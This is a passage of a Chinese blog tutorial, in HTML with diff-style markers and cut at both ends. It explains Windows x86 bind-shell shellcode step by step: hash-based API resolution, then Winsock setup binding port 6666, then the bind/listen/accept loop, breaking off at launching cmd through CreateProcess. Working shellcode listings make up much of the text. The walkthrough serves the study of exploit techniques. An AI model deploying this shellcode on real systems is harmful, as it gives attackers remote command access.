</span><br></pre></td></tr></table></figure>
+<p>首先将所有寄存器压栈,即使有的寄存器不需要压栈保存,也要使用这条指令,因为它短</p>
+<p>假设当前仍然是在kernel32.dll中解析函数,这意味着find_lib_functions中的push edi不会执行,那么此时的堆栈状态是</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918172313484.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918172313484.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918172313484"></p>
+<p>ebp指向的是kernel32.dll或者ws2_32.dll的基地址,库基地址偏移0x3c的地方是库的PE头,</p>
+<p>PE头偏移0x78的地方是导出函数地址(RVA)表的指针,这个地址交给ecx保管</p>
+<p>ecx加上ebp的作用是获得导出函数地址表的绝对虚拟地址(刚才ecx中是相对于库基址的相对虚拟地址)</p>
+<p>ecx+0x20处是导出函数名表的指针,解引用后将导出函数名表的相对基地址交给ebx保管</p>
+<p>ebx再加上ebp就得到了导出函数名表的绝对虚拟地址</p>
+<p>edi置零,将会作为中圈循环变量</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>值意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>eax</td>
+<td>RVA(PE头)</td>
+</tr>
+<tr>
+<td>ebx</td>
+<td>VA(导出函数名表)</td>
+</tr>
+<tr>
+<td>ecx</td>
+<td>VA(导出函数地址表)</td>
+</tr>
+<tr>
+<td>edi</td>
+<td>中圈循环变量,作为导出函数表的下标</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="中圈循环一次开始"><a href="#中圈循环一次开始" class="headerlink" title="中圈循环一次开始"></a>中圈循环一次开始</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>
+<p>edi每次自增1,然后[ebx+edi<em>4]基址变址寻址,ebx是导出函数名表的基地址,`ebx+edi</em>4`就相当于下标访问数组name[edi],</p>
+<p>这个导出函数名表的每一项都是字符串指针,解引用后取得一个函数名字符串的相对基地址,放到esi,然后esi+ebp得到该函数名字符串的绝对基地址.</p>
+<p>cdq用eax带符号拓展将edx置零,因为edx马上就要存放该导出函数名的哈希值了</p>
+<h3 id="内圈循环hash-loop"><a href="#内圈循环hash-loop" class="headerlink" title="内圈循环hash_loop"></a>内圈循环hash_loop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>
+<p>内圈循环就是计算esi开始的导出函数名的哈希值</p>
+<p>lodsb相当于</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>
+<p>每次取该函数名的一个字节放到al上,和0x71按位异或之后用dl减去该异或值,dl负责累计哈希值</p>
+<p>如果al与0x71异或得到0x71说明al本来就是00,说明该字符串遍历到头’\0’了,此时算是计算完了本函数名的哈希值</p>
+<h3 id="中圈循环一次判断"><a href="#中圈循环一次判断" class="headerlink" title="中圈循环一次判断"></a>中圈循环一次判断</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp dl, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">jnz next_function_loop </span><br></pre></td></tr></table></figure>
+<p>al中存放刚计算出哈希值,esp+0x1c指向的是我们正在给他解析地址的函数摘要</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918171355607"></p>
+<p>al与[esp+0x1c]一比划,如果相等说明该找到了目标函数,跳出中圈循环</p>
+<p>如果不相等说明当前库函数名不是我们想要解析的,需要中圈遍历下一个函数名,因此<code>jnz next_function_loop</code></p>
+<h3 id="外圈循环一次结束-回写目标函数绝对地址"><a href="#外圈循环一次结束-回写目标函数绝对地址" class="headerlink" title="外圈循环一次结束,回写目标函数绝对地址"></a>外圈循环一次结束,回写目标函数绝对地址</h3><p>此时寄存器中值的意义来自 中圈循环初始化</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>ebx</th>
+<th>VA(导出函数名表)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ecx</td>
+<td>VA(导出函数地址表)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi] 		; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">							; relative offset of matched function </span><br><span class="line">xchg eax, ebp 				; move func addr into eax </span><br><span class="line">pop edi 					; edi is last onto stack in pushad </span><br><span class="line">stosd 					; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad					; restore registers </span><br></pre></td></tr></table></figure>
+<p>ecx+0x24指向序号表的RVA,解引用后将序号表RVA放到ebx上然后加上ebp中的库基址就得到了VA(序号表)</p>
+<p>用函数名表的下标查序号表,得到的值作为下标查地址表就得到了函数地址,</p>
+<p>在回写之前首先退栈还原edi,这是因为在中圈循环初始化时所有寄存器都压栈保存了,后来无法保证edi是否被修改过,因此这里采用堆栈上保存的值还原edi,由于edi是最后一个入栈的寄存器,此时位于栈顶,直接pop就可以还原了,在图上看就是</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918171355607"></p>
+<p>然后使用stosd,相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov [edi],eax</span><br><span class="line">add edi,4</span><br></pre></td></tr></table></figure>
+<p>这就将函数地址回写到了预留的函数地址空间中了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174549264.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174549264.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918174549264"></p>
+<p>然后再将edi压栈是为了凑齐popad的结构,给edi占位防止错位弹出</p>
+<p>最后popad将所有压栈保存的寄存器还原,此时的堆栈状态为</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173600627.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173600627.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918173600627"></p>
+<p>所有寄存器的意义为</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173623051.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173623051.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918173623051"></p>
+<h3 id="外圈循环判断是否全部解析完毕"><a href="#外圈循环判断是否全部解析完毕" class="headerlink" title="外圈循环判断是否全部解析完毕"></a>外圈循环判断是否全部解析完毕</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmp esi, edi 				; loop until we reach end of last hash </span><br><span class="line">jne find_lib_functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>一开始给8个符号的地址只预留了24字节的空间,能够容纳6个符号,剩下两个符号需要覆盖摘要值</p>
+<p>当edi追上esi的时候意味着覆盖完成,8个符号已经都解析了,此时外圈循环也结束了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174325158.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174325158.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918174325158"></p>
+<h2 id="建立Socket通信"><a href="#建立Socket通信" class="headerlink" title="建立Socket通信"></a>建立Socket通信</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop esi 					; saved location of first winsock function </span><br><span class="line">							; we will lodsd and call each func in sequence </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在外圈循环一次的时候曾经区别处理过ws2_32.dll的函数有一个push edi压栈,意思是压栈保存第一条ws2_32.dll函数的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>在执行本条指令<strong>之前</strong>的堆栈状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918175317614.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918175317614.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918175317614"></p>
+<p>pop esi之后,esi就指向了第一条ws2_32的函数在预留空间中的地址,也就是WSAStartup的预留地址</p>
+<h3 id="调用WSAStartUp"><a href="#调用WSAStartUp" class="headerlink" title="调用WSAStartUp"></a>调用WSAStartUp</h3><blockquote>
+<p>该API函数作用是为进程使用Winsock模块初始化,必须先调用该函数才可以激活Winsock模块中的其他函数,其接口为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">WSAStartup</span><span class="params">(</span></span><br><span class="line"><span class="params">        WORD      wVersionRequired,<span class="comment">//可以使用的windows 套接字规范的最高版本</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">  [out] LPWSADATA lpWSAData<span class="comment">//返回值,指向WSADATA结构体的指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p>其中32位机器上,WSADATA长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> &#123;</span></span><br><span class="line">        WORD                    wVersion;<span class="comment">//我们要使用的版本</span></span><br><span class="line">        WORD                    wHighVersion;<span class="comment">//系统能提供给我们的版本</span></span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];<span class="comment">//当前库的秒数信息，2.0是第2版的意思</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;<span class="comment">//返回可用的socket数量,2版本只有就没用了</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;<span class="comment">//UDP数据报信息大小,2版本只有就没用了</span></span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;<span class="comment">//供应商特定的信息,2版本只有就没用了</span></span><br><span class="line">&#125; WSADATA;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>共11个字节</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; initialize winsock </span><br><span class="line">	</span><br><span class="line">	push esp 					; use stack for WSADATA </span><br><span class="line">	push 0x02 				; wVersionRequested </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; WSAStartup </span><br></pre></td></tr></table></figure>
+<p>首先esp压栈作为第二个参数的地址,返回的WSADATA结构体将会写到此时的栈顶</p>
+<p>0x02压栈作为第一个参数,即套接字版本号</p>
+<p>esi恰好就指向WSAStartUp的预留地址,lodsd相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[esi]</span><br><span class="line">add esi,4</span><br></pre></td></tr></table></figure>
+<p>就解引用将函数的绝对地址放到eax上了</p>
+<p>然后call eax调用API,返回值写到所有参数之前的栈顶上,如果函数调用成功则eax=0</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918181142886.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918181142886.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918181142886"></p>
+<h3 id="给”CMd”画上句号"><a href="#给”CMd”画上句号" class="headerlink" title="给”CMd”画上句号"></a>给”CMd”画上句号</h3><p>趁着eax刚从WSAStartUp返回来,值为0,将0放到”CMd”字符串后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; null-terminate &quot;cmd&quot; </span><br><span class="line">	mov byte ptr [esi + 0x13], al ; eax = 0 if WSAStartup() worked </span><br></pre></td></tr></table></figure>
+<h3 id="调用WSASocketA"><a href="#调用WSASocketA" class="headerlink" title="调用WSASocketA"></a>调用WSASocketA</h3><blockquote>
+<p>WSASockA创建一个绑定到特殊服务提供者的套接字</p>
+<p>其函数接口为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SOCKET WSAAPI <span class="title function_">WSASocketA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 af,<span class="comment">//网络层协议,AF_INET(2)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 type,<span class="comment">//传输层类型SOCK_STREAM(1)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 protocol,<span class="comment">//传输层协议,TCP(6),UDP(17)</span></span></span><br><span class="line"><span class="params">  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,<span class="comment">//WSAPROTOCOL_INFO结构体指针,用于存储信息</span></span></span><br><span class="line"><span class="params">  [in] GROUP               g,<span class="comment">//套接字组ID</span></span></span><br><span class="line"><span class="params">  [in] DWORD               dwFlags<span class="comment">//套接字属性标志</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p>如果调用成功,返回该套接字的描述符</p>
+</blockquote>
+<h4 id="清空栈帧-相当于填充NULL作为参数"><a href="#清空栈帧-相当于填充NULL作为参数" class="headerlink" title="清空栈帧,相当于填充NULL作为参数"></a>清空栈帧,相当于填充NULL作为参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; clear some stack to use as NULL parameters </span><br><span class="line">	lea ecx, [eax + 0x30] 		; sizeof(STARTUPINFO) = 0x44, ecx=0x30,重复30次</span><br><span class="line">	mov edi, esp ;当前栈顶设置为串拷贝的目标</span><br><span class="line">	rep stosd 				; eax is still 0 eax拷贝到edi,edi自增4,相当于全都置零</span><br></pre></td></tr></table></figure>
+<p>执行之前栈帧的状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191550943.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191550943.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918191550943"></p>
+<p>执行之后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191620311.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191620311.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918191620311"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">; create socket </span><br><span class="line">	inc eax 	;eax=1</span><br><span class="line">	push eax					; type = 1 (SOCK_STREAM) ,1压栈</span><br><span class="line">	inc eax ;eax=2</span><br><span class="line">	push eax ; af = 2 (AF_INET) IPv4协议</span><br><span class="line">	lodsd ;[esi]-&gt;eax,esi+=4,eax指向WSASocketA的地址</span><br><span class="line">	call eax ; WSASocketA </span><br><span class="line">	xchg ebp, eax				; save SOCKET descriptor in ebp (safe from </span><br><span class="line">								; being changed by remaining API calls) </span><br></pre></td></tr></table></figure>
+<p>调用WSASocketA之前,栈帧的状态为</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918192112499.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918192112499.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918192112499"></p>
+<p>函数调用返回后,eax中存放的是套接字描述符,交换到ebp中保存起来</p>
+<h3 id="bind-listen-accept循环"><a href="#bind-listen-accept循环" class="headerlink" title="bind,listen,accept循环"></a>bind,listen,accept循环</h3><h4 id="初始化bind参数"><a href="#初始化bind参数" class="headerlink" title="初始化bind参数"></a>初始化bind参数</h4><blockquote>
+<p>bind函数用来绑定套接字</p>
+<p>其接口为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bind</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET         s,<span class="comment">//套接字描述符</span></span></span><br><span class="line"><span class="params">       <span class="type">const</span> sockaddr *name,<span class="comment">//sockaddr结构体指针,该结构体用于指定ipv4地址还有端口号</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>            namelen<span class="comment">//name指向的结构体的大小</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p>只要是<code>namelen&gt;sizeof(*name)</code>就可以,因此namelen可以往大了设置为任意大小</p>
+<p>sockaddr用来指定ip协议类型,ip地址还有端口号</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line">	<span class="type">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>相当于sockaddr_in结构体,二者在大小上是相同的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">	<span class="type">short</span> <span class="type">int</span> sin_family; <span class="comment">/* Address family */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> sin_port; <span class="comment">/* Port number */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet address */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* Same size as struct sockaddr */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; push bind parameters </span><br><span class="line">	mov eax, 0x0a1aff02 		; 0x1a0a = port 6666, 0x02 = AF_INET </span><br><span class="line">	xor ah, ah					; remove the ff from eax </span><br><span class="line">	push eax	 				; we use 0x0a1a0002 as both the name (struct </span><br><span class="line">								; sockaddr) and namelen (which only needs to </span><br><span class="line">								; be large enough) </span><br><span class="line">	push esp 					; pointer to our sockaddr struct </span><br></pre></td></tr></table></figure>
+<p>0x0a1a0002这个值直接压栈作为namelen,足够大了</p>
+<p>0x0a1a0002,最低两个字节0x0002用来填sockaddr_in.sin_family</p>
+<p>然后用0x0a1a=6666填sockaddr_in.sin_port</p>
+<p>将namelen的栈中地址压栈,因为其上的数也可以作为sock_addr结构体</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918195551305.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918195551305.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918195551305"></p>
+<p>到此还有一个参数没有压栈,即套接字描述符,它保存在ebp中</p>
+<h4 id="三联循环-复用循环代码"><a href="#三联循环-复用循环代码" class="headerlink" title="三联循环,复用循环代码"></a>三联循环,复用循环代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	</span><br><span class="line">; call bind(), listen() and accept() in turn </span><br><span class="line">call_loop: </span><br><span class="line">	push ebp					; saved SOCKET descriptor (we implicitly pass </span><br><span class="line">								; NULL for all other params) </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; call the next function </span><br><span class="line">	test eax, eax 				; bind() and listen() return 0, accept() </span><br><span class="line">								; returns a SOCKET descriptor </span><br><span class="line">	jz call_loop </span><br></pre></td></tr></table></figure>
+<h5 id="首先调用bind"><a href="#首先调用bind" class="headerlink" title="首先调用bind"></a>首先调用bind</h5><p>ebp存放的是套接字描述符,压栈</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918194646766.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918194646766.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918194646766"></p>
+<p>然后lodsd将bind函数地址搬到eax上,然后函数edi函数指针后移4个字节,指向listen了</p>
+<p>eax中是bind的地址,call eax调用bind了</p>
+<p>如果调用成功则返回eax=0,又恰好bind,listen成功的返回值eax=0,accept成功的返回值非零,因此可以根据eax值判断该函数是不是accept</p>
+<p>如果返回0则不是,说明三联还没有完成,重新call_loop</p>
+<h5 id="然后调用listen"><a href="#然后调用listen" class="headerlink" title="然后调用listen"></a>然后调用listen</h5><blockquote>
+<p>listen函数,将套接字设置为监听状态</p>
+<p>其接口为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">listen</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET s,<span class="comment">//套接字描述符</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    backlog<span class="comment">//挂起连接队列的最大长度,不疼不痒</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里我们只对第一个参数,套接字描述符,感兴趣,backlog爱是啥是啥,反正不是0就行</p>
+<p>于是在第二次循环一开始又将ebp压入作为第一个参数,历史上的堆栈,爱谁谁作为第二个参数</p>
+<p>lodsd 又将listen地址放到eax上然后edi指向下一个函数accept,</p>
+<p>然后就调用了listen,返回eax=0</p>
+<h5 id="最后调用accept"><a href="#最后调用accept" class="headerlink" title="最后调用accept"></a>最后调用accept</h5><blockquote>
+<p>accept用于接收对套接字的连接</p>
+</blockquote>
+<p>调用成功返回新的套接字描述符</p>
+<h2 id="拱手让shell"><a href="#拱手让shell" class="headerlink" title="拱手让shell"></a>拱手让shell</h2><p>到此套接字通信就建立起来了,下面要创建一个cmd进程然后绑到套接字上</p>
+<blockquote>
+<p>CreateProcess用于创建一个新进程并创建其主线程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(  </span></span><br><span class="line"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span><br><span class="line"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  //这里放&quot;CMd&quot;</span></span></span><br><span class="line"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span><br><span class="line"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span><br><span class="line"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span><br><span class="line"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span><br><span class="line"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span><br><span class="line"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span><br><span class="line"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  